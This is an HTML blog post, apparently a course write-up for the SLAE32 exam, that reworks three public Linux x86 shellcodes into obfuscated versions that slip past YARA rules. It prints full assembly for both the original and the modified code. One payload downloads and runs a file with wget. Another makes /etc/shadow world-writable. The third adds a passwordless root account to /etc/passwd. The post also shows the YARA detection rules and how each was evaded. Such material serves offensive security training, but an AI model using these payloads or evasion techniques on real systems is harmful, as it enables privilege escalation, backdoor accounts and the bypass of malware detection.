@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>SLAE32 | Jeremy Catelain</title>
+<meta name="generator" content="Jekyll v3.9.2" />
+<meta property="og:title" content="SLAE32" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description of the assignment Take up at least 3 shellcodes from shell-Storm and create a polymorphic versions to beat the pattern matching The polymorphic version cannot be larger than 150% of the existing shellcode Bonus points for making it shorter in length than the original As follows the list of shellcodes that we are going to change into polymorphic ones: downloadexec chmod 0777 /etc/shadow Add r00t user to /etc/passwd" />
+<meta property="og:description" content="Description of the assignment Take up at least 3 shellcodes from shell-Storm and create a polymorphic versions to beat the pattern matching The polymorphic version cannot be larger than 150% of the existing shellcode Bonus points for making it shorter in length than the original As follows the list of shellcodes that we are going to change into polymorphic ones: downloadexec chmod 0777 /etc/shadow Add r00t user to /etc/passwd" />
+<link rel="canonical" href="http://localhost:4000/slae32/2022/10/05/Assign6-Poly.html" />
+<meta property="og:url" content="http://localhost:4000/slae32/2022/10/05/Assign6-Poly.html" />
+<meta property="og:site_name" content="Jeremy Catelain" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-10-05T08:45:58+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SLAE32" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-05T08:45:58+02:00","datePublished":"2022-10-05T08:45:58+02:00","description":"Description of the assignment Take up at least 3 shellcodes from shell-Storm and create a polymorphic versions to beat the pattern matching The polymorphic version cannot be larger than 150% of the existing shellcode Bonus points for making it shorter in length than the original As follows the list of shellcodes that we are going to change into polymorphic ones: downloadexec chmod 0777 /etc/shadow Add r00t user to /etc/passwd","headline":"SLAE32","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/slae32/2022/10/05/Assign6-Poly.html"},"url":"http://localhost:4000/slae32/2022/10/05/Assign6-Poly.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Jeremy Catelain" /></head>
+<body><header class="site-header" role="banner">
+
+    <div class="wrapper"><div class="align-left">
+            <div class="image-cropper"><img src="/images/photo-profil-2.jpg" alt="photo de profil" class="rounded" /></div>
+            <div class="align-left2">
+                <a class="site-title" rel="author" href="/">Jeremy Catelain </a><div class="site-job">Cybersecurity Consultant</div></div>
+        </div><nav class="site-nav">
+            <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+            <label for="nav-trigger">
+                <span class="menu-icon">
+                    <svg viewBox="0 0 18 15" width="18px" height="15px">
+                        <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z" />
+                    </svg>
+                </span>
+            </label>
+
+            <div class="trigger"><a class="page-link" href="/categories/2022-09-14-categories.html">CATEGORIES</a><a class="page-link" href="/">Home</a><a class="page-link" href="/about/">ABOUT</a></div>
+        </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+
+        <div class="wrapper">
+                <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+        <header class="post-header">
+            <div class="post-header-about">
+                <h1 class="post-list-heading2 p-name" itemprop="name headline">SLAE32</h1>
+                <h1 class="post-list-heading3 p-name" itemprop="name headline">|  Assignment 6 - Polymorph</h1>
+            </div>
+            <p class="post-meta-title">
+                <time class="dt-published" datetime="2022-10-05T08:45:58+02:00" itemprop="datePublished">Oct 5, 2022
+                </time></p><div class="github-link">
+                <a class="github-link-post" href="https://github.com/jeremycatelain/SLAE32-Assignments/tree/main/assignment6"> Github repository </a>
+            </div></header>
+
+        <div class="post-content e-content" itemprop="articleBody">
+            <h3 id="-description-of-the-assignment-"><span style="color:#2d8fb3;"> Description of the assignment </span></h3>
+
+<ul>
+  <li>Take up at least 3 shellcodes from shell-Storm and create a polymorphic versions to beat the pattern matching</li>
+  <li>The polymorphic version cannot be larger than 150% of the existing shellcode</li>
+  <li>Bonus points for making it shorter in length than the original</li>
+</ul>
+
+<p>As follows the list of shellcodes that we are going to change into polymorphic ones:</p>
+<ul>
+  <li>downloadexec</li>
+  <li>chmod 0777 /etc/shadow</li>
+  <li>Add r00t user to /etc/passwd</li>
+</ul>
+
+<!--more-->
+
+<h3 id="--part-1---downloadexec-"><span style="color:#2d8fb3;">  Part 1 - downloadexec </span></h3>
+
+<p><strong><em>Link to the original shellcode: http://shell-storm.org/shellcode/files/shellcode-862.php</em></strong></p>
+
+<p>First we retrieved the shellcode and make it works with the localhost.</p>
+
+<p><img src="/assets/slae32-img/assignment6/assignment6.9.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p>The shellcode download a file “x” and execute it which displays an “HelloWorld” as we can see.</p>
+
+<p>We supposed that the yara rule as follows flagged our original shellcode.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule download_exec_shell {
+    meta:
+	    description = "Personal rule"
+    strings:
+	    $y1 = {74 2f 2f 78} 
+	    $y2 = {6C 68 6F 73}
+	    $y3 = {6C 6f 63 61}
+	    $y4 = {2f 77 67 65}
+	    $y5 = {2f 62 69 6e}
+	    $y6 = {2f 75 73 72}
+    condition:
+    $y1 and $y2 and $y3 or $y4 and $y5 and $y6 
+}
+</code></pre></div></div>
+
+<p>The y1 to y3 strings correspond to the instruction for the setting of the “localhost/x”:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push 0x782f2f74  ; x//t
+push 0x736F686C  ; sohl
+push 0x61636f6c  ; acol
+</code></pre></div></div>
+
+<p>And the y4 to y6 strings correspond to the instrution for the setting of the “/usr/bin/wget”:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push 0x74
+push 0x6567772f ;egw/
+push 0x6e69622f ;nib/
+push 0x7273752f ;rsu/ 
+</code></pre></div></div>
+
+<p>The Yara rule triggered the detection as follows:</p>
+
+<p><img src="/assets/slae32-img/assignment6/assignment6.7.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p>Then, we modified our strings to bypass the Yara rule.</p>
+
+<p>Modifications to bypass the “localhost/x” condition:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov dword [esp-4], 0x782f2f74 ; t//x
+mov dword [esp-8], 0x736F686C ; lhos
+mov esi, 0x50525e5b
+add esi, 0x11111111
+mov dword [esp-12], esi ; loca
+</code></pre></div></div>
+
+<p>Modifications to bypass the “/usr/bin/wget” condition:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov byte [esp-1], 0x74
+mov esi, 0x5456661e
+add esi, 0x11111111
+mov dword [esp-5], esi ;egw/
+mov dword [esp-9], 0x6e69622f ;nib/
+mov dword [esp-13], 0x7273752f ;rsu/
+</code></pre></div></div>
+
+<p>As we can see, our modification succeded to bypass the yara rule.</p>
+
+<p><img src="/assets/slae32-img/assignment6/assignment6.8.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p><strong><em>Shellcode Length details</em></strong></p>
+<ul>
+  <li>Length of the original shellcode: 103 bytes</li>
+  <li>Length of the modified shellcode: 142 bytes</li>
+  <li>Percentage length of the modified shellcode from the original: 137.8%</li>
+</ul>
+
+<p><strong>Original shellcode:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; INITIAL SHELLCODE
+; Filename: downloadexec.nasm
+; Author: Daniel Sauder
+; Website: http://govolution.wordpress.com/
+; Tested on: Ubuntu 12.04 / 32Bit
+; License: http://creativecommons.org/licenses/by-sa/3.0/
+
+; Shellcode:
+; - download 192.168.2.222/x with wget
+; - chmod x
+; - execute x
+; - x is an executable
+; - length 108 bytes
+
+global _start
+
+section .text
+
+_start:
+
+    ;fork
+    xor eax,eax
+    mov al,0x2
+    int 0x80
+    xor ebx,ebx
+    cmp eax,ebx
+    jz child
+  
+    ;wait(NULL)
+    xor eax,eax
+    mov al,0x7
+    int 0x80
+    
+    ;chmod x
+    xor ecx,ecx
+    xor eax, eax
+    push eax
+    mov al, 0xf
+    push 0x78
+    mov ebx, esp
+    xor ecx, ecx
+    mov cx, 0x1ff
+    int 0x80
+
+    ;exec x
+    xor eax, eax
+    push eax
+    push 0x78
+    mov ebx, esp
+    push eax
+    mov edx, esp
+    push ebx
+    mov ecx, esp
+    mov al, 11
+    int 0x80
+
+child:
+    ;download 192.168.2.222//x with wget
+    push 0xb
+    pop eax
+    cdq
+    push edx
+
+    push 0x782f2f74  ; x//t
+    push 0x736F686C  ; sohl
+    push 0x61636f6c  ; acol
+    mov ecx,esp
+    push edx
+
+    push 0x74 ;t
+    push 0x6567772f ;egw/
+    push 0x6e69622f ;nib/
+    push 0x7273752f ;rsu/
+    mov ebx,esp
+    push edx
+    push ecx
+    push ebx
+    mov ecx,esp
+    int 0x80
+</code></pre></div></div>
+
+<p><strong>Modified shellcode:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; MODIFIED SHELLCODE
+; Filename: downloadexecpoly.nasm
+; Author: Jeremy Catelain
+
+global _start
+
+section .text
+
+_start:
+
+    ;fork
+    xor eax,eax
+    mov al,0x1
+    add al, 0x1
+    int 0x80
+    xor ebx,ebx
+    cmp eax,ebx
+    jz child
+  
+    ;wait(NULL)
+    xor eax,eax
+    mov al,0x7
+    int 0x80
+    
+    ;chmod x
+    xor ecx,ecx
+    mov eax, ecx
+    push eax
+    mov al, 0xf
+    push 0x78
+    mov ebx, esp
+    xor ecx, ecx
+    mov cx, 0x1ff
+    int 0x80
+
+    ;exec x
+    xor eax, eax
+    push eax
+    push 0x78
+    mov ebx, esp
+    push eax
+    mov edx, esp
+    push ebx
+    mov ecx, esp
+    mov al, 11
+    int 0x80
+
+child:
+    ;download 192.168.2.222//x with wget
+    push 0xb
+    pop eax
+    cdq
+    push edx
+
+    mov dword [esp-4], 0x782f2f74 ; t//x
+    mov dword [esp-8], 0x736F686C ; lhos
+    mov esi, 0x50525e5b
+    add esi, 0x11111111
+    mov dword [esp-12], esi ; loca
+
+    sub esp, 12
+
+    mov ecx,esp
+    push edx
+
+    mov byte [esp-1], 0x74
+    mov esi, 0x5456661e
+    add esi, 0x11111111
+    mov dword [esp-5], esi ;egw/
+    mov dword [esp-9], 0x6e69622f ;nib/
+    mov dword [esp-13], 0x7273752f ;rsu/
+    sub esp, 13
+    mov ebx,esp
+    push edx
+    push ecx
+    push ebx
+    mov ecx,esp
+    int 0x80
+</code></pre></div></div>
+
+<h3 id="--part-2---chmod-0777-etcshadow-"><span style="color:#2d8fb3;">  Part 2 - chmod 0777 /etc/shadow </span></h3>
+
+<p><strong><em>link to the original shellcode: http://shell-storm.org/shellcode/files/shellcode-875.php</em></strong></p>
+
+<p>The aim of this second shellcode is to modify the access rights on the /etc/shadow file. To do so, only the chmod syscall (EAX = 0xf) is performed.</p>
+
+<p><img src="/assets/slae32-img/assignment6/assignment6.10.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p>We supposed that the yara rule as follows flagged our original shellcode.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule chmodshadow {
+    meta:
+	    description = "Personal rule"
+    strings:
+	    $y1 = {2f 2f 73 68}
+	    $y2 = {2f 65 74 63}
+	    $y3 = {3e 1f 3a 56}
+    condition:
+    $y1 and $y2 and $y3
+}
+</code></pre></div></div>
+
+<p>The y1 to y3 strings correspond to the instruction for the setting of the “/etc/shadow”:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov esi, 0x563a1f3e
+add esi, 0x21354523
+mov dword [esp-4], esi
+mov dword [esp-8], 0x68732f2f
+mov dword [esp-12], 0x6374652f
+</code></pre></div></div>
+
+<p>The Yara rule effectively detected our shellcode:</p>
+
+<p><img src="/assets/slae32-img/assignment6/assignment6.16.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p>Then, we modified our strings to bypass the Yara rule.</p>
+
+<p>Modifications to bypass the ““/etc/shadow”” condition:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov esi, 0x6374ef32 
+add esi, 0x13FA752F ;0x776F6461
+mov dword [esp-4], esi
+sub esi, 0xefc3532
+mov dword [esp-8], esi ; 0x68732f2f
+mov dword [esp-12], 0x6374652f
+</code></pre></div></div>
+
+<p>As we can see, our modification succeded to bypass the yara rule.</p>
+
+<p><img src="/assets/slae32-img/assignment6/assignment6.17.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p><strong><em>Shellcode Length details</em></strong></p>
+<ul>
+  <li>Length of the original shellcode: 49 bytes</li>
+  <li>Length of the modified shellcode: 52 bytes</li>
+  <li>Percentage length of the modified shellcode from the original: 106%</li>
+</ul>
+
+<p><strong>Original shellcode:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; Title:    chmod 0777 /etc/shadow (a bit obfuscated) Shellcode - 51 Bytes
+; Platform: linux/x86
+; Date:     2014-06-22
+; Author:   Osanda Malith Jayathissa (@OsandaMalith)
+
+section .text
+global _start
+
+_start: 
+mov ebx, eax
+xor eax, ebx
+push dword eax
+mov esi, 0x563a1f3e
+add esi, 0x21354523
+mov dword [esp-4], esi
+mov dword [esp-8], 0x68732f2f
+mov dword [esp-12], 0x6374652f
+sub esp, 12
+mov    ebx,esp
+push word  0x1ff
+pop    cx
+mov    al,0xf
+int    0x80
+</code></pre></div></div>
+
+<p><strong>Modified shellcode:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; MODIFIED SHELLCODE
+; Filename: chmodshadow-poly.nasm
+; Author: Jeremy Catelain
+; chmod 0777 /etc/shadow (a bit obfuscated) Shellcode - 51 Bytes
+
+section .text
+global _start
+
+_start: 
+mov ebx, eax
+xor eax, ebx
+push dword eax
+mov esi, 0x6374ef32 
+add esi, 0x13FA752F ;0x776F6461
+mov dword [esp-4], esi
+sub esi, 0xefc3532
+mov dword [esp-8], esi ; 0x68732f2f
+mov dword [esp-12], 0x6374652f
+sub esp, 12
+mov    ebx,esp
+push word  0x1ff
+pop    cx
+mov    al,0xf
+int    0x80
+</code></pre></div></div>
+
+<h3 id="--part-3---add-r00t-user-to-etcpasswd-"><span style="color:#2d8fb3;">  Part 3 - Add r00t user to /etc/passwd </span></h3>
+
+<p><strong><em>link to the original shellcode: http://shell-storm.org/shellcode/files/shellcode-211.php</em></strong></p>
+
+<p>The aim of this shellcode is to add a r00t user to the /etc/passwd file. 
+To do so, the following steps are followed:</p>
+<ul>
+  <li>open(“/etc//passwd”, O_WRONLY  O_APPEND)</li>
+  <li>write(ebx, “r00t::0:0:::”, 12)</li>
+  <li>close(ebx)</li>
+  <li>exit()</li>
+</ul>
+
+<p><strong>Result:</strong></p>
+
+<p><strong><em>Execution of the shellcode:</em></strong></p>
+
+<p><img src="/assets/slae32-img/assignment6/assignment6.12.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p><strong><em>Content of the /etc/passwd:</em></strong></p>
+
+<p><img src="/assets/slae32-img/assignment6/assignment6.11.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p>We supposed that the yara rule as follows flagged our original shellcode.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule addr00tuser {
+    meta:
+	    description = "Personal rule"
+    strings:
+	    $y1 = {73 73 77 64}
+	    $y2 = {2f 2f 70 61}
+	    $y3 = {2f 65 74 63}
+	    $y4 = {30 3a 3a 3a}
+	    $y5 = {3a 3a 30 3a}
+	    $y6 = {72 30 30 74}
+    condition:
+    $y1 and $y2 and $y3 or $y4 and $y5 and $y6 
+}
+</code></pre></div></div>
+
+<p>The y1 to y3 strings correspond to the instruction for the setting of the “/etc//passwd”:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> push 0x64777373 ; dwss
+ push 0x61702f2f ; ap//
+ push 0x6374652f ; cte/
+</code></pre></div></div>
+
+<p>And the y4 to y6 strings correspond to the instrution for the setting of the “r00t::0:0:::”:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> push 0x3a3a3a30 ; :::0
+ push 0x3a303a3a ; :0::
+ push 0x74303072 ; t00r
+</code></pre></div></div>
+
+<p>The Yara rule effectively detected our shellcode:</p>
+
+<p><img src="/assets/slae32-img/assignment6/assignment6.15.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p>Then, we modified our strings to bypass the Yara rule.</p>
+
+<p>Modifications to bypass the “/etc//passwd” condition:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov esi, 0x53666162
+add esi, 0x11111211
+mov dword [esp-4], esi ; dwss
+sub esi, 0x3074444
+mov dword [esp-8], esi ; ap//
+sub esp, 8
+push 0x6374652f
+</code></pre></div></div>
+
+<p>Modifications to bypass the “r00t::0:0:::” condition:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov esi, 0x2805e3b8
+add esi, 0x12345678 
+mov dword [esp-4], esi ; :::0
+sub esp, 4
+push 0x3a303a3a ; :0::
+push 0x74303072 ; t00r
+</code></pre></div></div>
+
+<p>As we can see, our modification succeded to bypass the yara rule.</p>
+
+<p><img src="/assets/slae32-img/assignment6/assignment6.8.PNG" alt="drawing" style="width:900px;" /></p>
+
+<p><strong><em>Shellcode Length details</em></strong></p>
+<ul>
+  <li>Length of the original shellcode: 69 bytes</li>
+  <li>Length of the modified shellcode: 100 bytes</li>
+  <li>Percentage length of the modified shellcode from the original: 144.9%</li>
+</ul>
+
+<p><strong>Original shellcode:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>;By Kris Katterjohn 11/14/2006
+;69 byte shellcode to add root user 'r00t' with no password to /etc/passwd
+;for Linux/x86
+
+section .text
+
+      global _start
+
+ _start:
+
+ ; open("/etc//passwd", O_WRONLY | O_APPEND)
+
+      push byte 5
+      pop eax
+      xor ecx, ecx
+      push ecx
+      push 0x64777373
+      push 0x61702f2f
+      push 0x6374652f
+      mov ebx, esp
+      mov cx, 02001Q
+      int 0x80
+
+      mov ebx, eax
+
+ ; write(ebx, "r00t::0:0:::", 12)
+
+      push byte 4
+      pop eax
+      xor edx, edx
+      push edx
+      push 0x3a3a3a30 ; :::0
+      push 0x3a303a3a ; :0::
+      push 0x74303072 ; t00r
+      mov ecx, esp
+      push byte 12
+      pop edx
+      int 0x80
+
+ ; close(ebx)
+
+      push byte 6
+      pop eax
+      int 0x80
+
+ ; exit()
+
+      push byte 1
+      pop eax
+      int 0x80
+</code></pre></div></div>
+
+<p><strong>Modified shellcode:</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; MODIFIED SHELLCODE
+; Filename: addr00tuser-poly.nasm
+; Author: Jeremy Catelain
+;69 byte shellcode to add root user 'r00t' with no password to /etc/passwd
+;for Linux/x86
+
+
+section .text
+
+      global _start
+
+ _start:
+
+ ; open("/etc//passwd", O_WRONLY | O_APPEND)
+
+      push byte 5
+      pop eax
+      xor ecx, ecx
+      push ecx
+      mov esi, 0x53666162
+      add esi, 0x11111211
+      mov dword [esp-4], esi ; dwss
+      sub esi, 0x3074444
+      mov dword [esp-8], esi ; ap//
+      sub esp, 8
+      push 0x6374652f
+      mov ebx, esp
+      mov cx, 02001Q
+      int 0x80
+
+      mov ebx, eax
+
+ ; write(ebx, "r00t::0:0:::", 12)
+
+      push byte 4
+      pop eax
+      xor edx, edx
+      push edx
+      mov esi, 0x2805e3b8
+      add esi, 0x12345678 
+      mov dword [esp-4], esi ; :::0
+      sub esp, 4
+      push 0x3a303a3a ; :0::
+      push 0x74303072 ; t00r
+      mov ecx, esp
+      push byte 12
+      pop edx
+      int 0x80
+
+ ; close(ebx)
+
+      push byte 6
+      pop eax
+      int 0x80
+
+ ; exit()
+
+      push byte 1
+      pop eax
+      int 0x80
+</code></pre></div></div>
+
+        </div>
+
+
+        <!--<a class="u-url" href="/slae32/2022/10/05/Assign6-Poly.html" hidden></a>
+          -->
+    </article>
+
+        </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+      <!--<h2 class="footer-heading">Jeremy Catelain</h2> -->
+
+    <div class="Github-link"></div>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <!--<ul class="contact-list">
+          <li class="p-name">Jeremy Catelain</li>
+        </ul> -->
+      </div>
+
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a class="social-media-listed" href="https://github.com/jeremycatelain"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jeremycatelain</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+          <p>COPYRIGHT 2022 JEREMY CATELAIN - ALL RIGHTS RESERVED.</p>
+      </div>
+  </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
